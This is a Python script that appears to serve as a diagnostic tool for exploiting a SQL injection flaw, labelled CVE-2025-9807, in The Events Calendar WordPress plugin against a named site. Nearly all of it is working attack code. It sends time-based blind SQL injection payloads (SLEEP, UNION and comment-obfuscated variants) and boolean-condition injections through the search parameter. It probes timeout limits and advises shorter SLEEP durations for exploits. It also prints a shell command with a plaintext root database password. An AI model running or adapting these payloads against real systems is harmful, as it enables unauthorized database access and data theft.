import requests
import time
from urllib.parse import quote

def test_sleep_directly(base_url):
    """
    Test if MySQL SLEEP() function works at all
    """
    print("="*70)
    print("MySQL SLEEP() Function Test")
    print("="*70 + "\n")
    
    tests = [
        {
            "name": "Direct SLEEP without condition",
            "payload": "test' OR SLEEP(5)-- -",
            "expected": 5,
            "description": "Tests if SLEEP() executes at all"
        },
        {
            "name": "SLEEP in SELECT",
            "payload": "test' UNION SELECT SLEEP(5)-- -",
            "expected": 5,
            "description": "Tests SLEEP in UNION query"
        },
        {
            "name": "SLEEP with comment bypass",
            "payload": "test'/**/OR/**/SLEEP(5)#",
            "expected": 5,
            "description": "Tests with comment obfuscation"
        },
        {
            "name": "Multiple SLEEP (should multiply delay)",
            "payload": "test' OR SLEEP(2) OR SLEEP(2) OR SLEEP(2)-- -",
            "expected": 6,
            "description": "Tests if multiple SLEEPs accumulate"
        },
        {
            "name": "SLEEP(0) - Should be instant",
            "payload": "test' AND SLEEP(0)-- -",
            "expected": 0,
            "description": "Control test - should not delay"
        },
    ]
    
    results = []
    
    for test in tests:
        print(f"[Test] {test['name']}")
        print(f"Description: {test['description']}")
        print(f"Payload: {test['payload']}")
        print(f"Expected delay: ~{test['expected']}s")
        
        test_url = f"{base_url}?s={quote(test['payload'])}"
        
        # Run 3 times for accuracy
        times = []
        for i in range(3):
            start = time.time()
            try:
                response = requests.get(test_url, timeout=20)
                elapsed = time.time() - start
                times.append(elapsed)
                print(f"  Attempt {i+1}: {elapsed:.2f}s", end="")
                
                if test['expected'] > 0 and elapsed >= (test['expected'] - 1):
                    print(" ✓")
                elif test['expected'] == 0 and elapsed < 1:
                    print(" ✓")
                else:
                    print(" ✗")
                    
            except requests.exceptions.Timeout:
                elapsed = time.time() - start
                times.append(elapsed)
                print(f"  Attempt {i+1}: TIMEOUT ({elapsed:.2f}s) ✓")
            except Exception as e:
                print(f"  Attempt {i+1}: Error - {e}")
            
            time.sleep(0.5)
        
        avg_time = sum(times) / len(times) if times else 0
        print(f"Average: {avg_time:.2f}s")
        
        if test['expected'] > 0:
            working = avg_time >= (test['expected'] - 1)
        else:
            working = avg_time < 1
        
        status = "✓ WORKING" if working else "✗ NOT WORKING"
        print(f"Result: {status}\n")
        
        results.append({
            'name': test['name'],
            'expected': test['expected'],
            'actual': avg_time,
            'working': working
        })
    
    return results


def check_query_execution(base_url):
    """
    Check if SQL queries execute at all
    """
    print("="*70)
    print("SQL Query Execution Test")
    print("="*70 + "\n")
    
    tests = [
        {
            "name": "Basic syntax error",
            "payload": "test'",
            "check": "Should cause SQL error or different behavior"
        },
        {
            "name": "Valid SQL closing quote",
            "payload": "test'-- -",
            "check": "Should execute without error"
        },
        {
            "name": "Always TRUE condition",
            "payload": "test' OR '1'='1'-- -",
            "check": "Might show all events"
        },
        {
            "name": "Always FALSE condition",
            "payload": "test' AND '1'='2'-- -",
            "check": "Should show no results"
        },
    ]
    
    baseline_url = f"{base_url}?s=normaltest"
    baseline_response = requests.get(baseline_url)
    baseline_size = len(baseline_response.content)
    
    print(f"Baseline (normal search): {baseline_size} bytes\n")
    
    for test in tests:
        print(f"[Test] {test['name']}")
        print(f"Payload: {test['payload']}")
        print(f"Expected: {test['check']}")
        
        test_url = f"{base_url}?s={quote(test['payload'])}"
        
        try:
            response = requests.get(test_url, timeout=10)
            response_size = len(response.content)
            
            print(f"Response size: {response_size} bytes", end="")
            
            if response_size != baseline_size:
                diff = abs(response_size - baseline_size)
                print(f" (Δ {diff} bytes) ⚠️  DIFFERENT")
            else:
                print(f" (same) ✓")
            
            # Check for SQL errors
            if 'sql' in response.text.lower() or 'mysql' in response.text.lower():
                print("  ⚠️  SQL error detected in response!")
            
        except Exception as e:
            print(f"  Error: {e}")
        
        print()
        time.sleep(0.5)


def check_php_mysql_limits(base_url):
    """
    Check if there are execution time limits
    """
    print("="*70)
    print("PHP/MySQL Execution Limits Test")
    print("="*70 + "\n")
    
    print("Testing progressive delays to find limit...\n")
    
    delays = [1, 2, 3, 5, 7, 10]
    
    for delay in delays:
        payload = f"test' AND SLEEP({delay})-- -"
        test_url = f"{base_url}?s={quote(payload)}"
        
        print(f"Testing SLEEP({delay})...", end=" ")
        
        start = time.time()
        try:
            response = requests.get(test_url, timeout=delay + 10)
            elapsed = time.time() - start
            
            if elapsed >= (delay - 0.5):
                print(f"{elapsed:.2f}s ✓ Working")
            else:
                print(f"{elapsed:.2f}s ✗ Cut short (limit: ~{elapsed:.0f}s)")
                print(f"\n⚠️  Detected execution time limit: ~{int(elapsed)}s")
                print("This might be:")
                print("  - PHP max_execution_time")
                print("  - MySQL wait_timeout")
                print("  - Web server timeout")
                return int(elapsed)
                
        except requests.exceptions.Timeout:
            elapsed = time.time() - start
            print(f"TIMEOUT at {elapsed:.2f}s ⚠️")
            if elapsed < delay:
                print(f"\n⚠️  Request timeout before SLEEP finished")
                print(f"Timeout limit: ~{int(elapsed)}s")
                return int(elapsed)
        except Exception as e:
            print(f"Error: {e}")
        
        time.sleep(0.5)
    
    print("\n✓ No execution time limit detected up to 10s")
    return None


def analyze_results(results, execution_limit):
    """
    Analyze test results and provide diagnosis
    """
    print("="*70)
    print("DIAGNOSIS")
    print("="*70 + "\n")
    
    working_tests = [r for r in results if r['working']]
    
    if len(working_tests) == 0:
        print("❌ MYSQL SLEEP() IS NOT WORKING\n")
        print("Possible causes:")
        print("  1. ❌ MySQL SLEEP() function disabled")
        print("  2. ❌ SQL queries not executing (input sanitized)")
        print("  3. ❌ WAF/Security plugin blocking")
        print("  4. ❌ Plugin has additional input validation")
        
        print("\nTo check MySQL SLEEP() status:")
        print("  docker exec wordpress-mysql mysql -u root -prootpassword")
        print("  mysql> SELECT SLEEP(5);")
        print("  (Should take 5 seconds)")
        
        print("\nTo check WordPress sanitization:")
        print("  - Check if Wordfence or similar security plugin active")
        print("  - Check wp-config.php for custom filters")
        
    elif len(working_tests) < len(results):
        print("⚠️  PARTIAL SLEEP() FUNCTIONALITY\n")
        print("Working payloads:")
        for r in working_tests:
            print(f"  ✓ {r['name']}: {r['actual']:.2f}s")
        
        print("\nNot working payloads:")
        for r in results:
            if not r['working']:
                print(f"  ✗ {r['name']}: {r['actual']:.2f}s (expected {r['expected']}s)")
        
        if execution_limit:
            print(f"\n⚠️  Execution time limit: ~{execution_limit}s")
            print(f"Solution: Use SLEEP({execution_limit - 1}) or shorter")
        
    else:
        print("✓✓✓ MYSQL SLEEP() IS WORKING!\n")
        print("All SLEEP() tests passed successfully.")
        
        if execution_limit:
            print(f"\n⚠️  But execution time limit detected: ~{execution_limit}s")
            print("Use shorter SLEEP() durations in your exploits")
        else:
            print("\nNo execution limits detected.")
            print("The vulnerability should be exploitable!")
            print("\nIf extraction still fails, the issue is:")
            print("  - Payload syntax (quote escaping)")
            print("  - Search parameter not vulnerable")
            print("  - Different vulnerable parameter exists")


def main():
    TARGET_URL = "https://wordpress.fauzanghaza.com/events/"
    
    print("\n" + "="*70)
    print("CVE-2025-9807 MySQL SLEEP() Diagnostic")
    print("="*70)
    print(f"Target: {TARGET_URL}")
    print(f"Plugin: The Events Calendar 6.6.4.1 (vulnerable)")
    print("="*70 + "\n")
    
    input("Press Enter to start diagnostic...\n")
    
    # Test 1: Direct SLEEP tests
    results = test_sleep_directly(TARGET_URL)
    
    # Test 2: Query execution
    check_query_execution(TARGET_URL)
    
    # Test 3: Execution limits
    execution_limit = check_php_mysql_limits(TARGET_URL)
    
    # Final analysis
    analyze_results(results, execution_limit)
    
    print("\n" + "="*70)
    print("Diagnostic complete. Review results above.")
    print("="*70)


if __name__ == "__main__":
    main()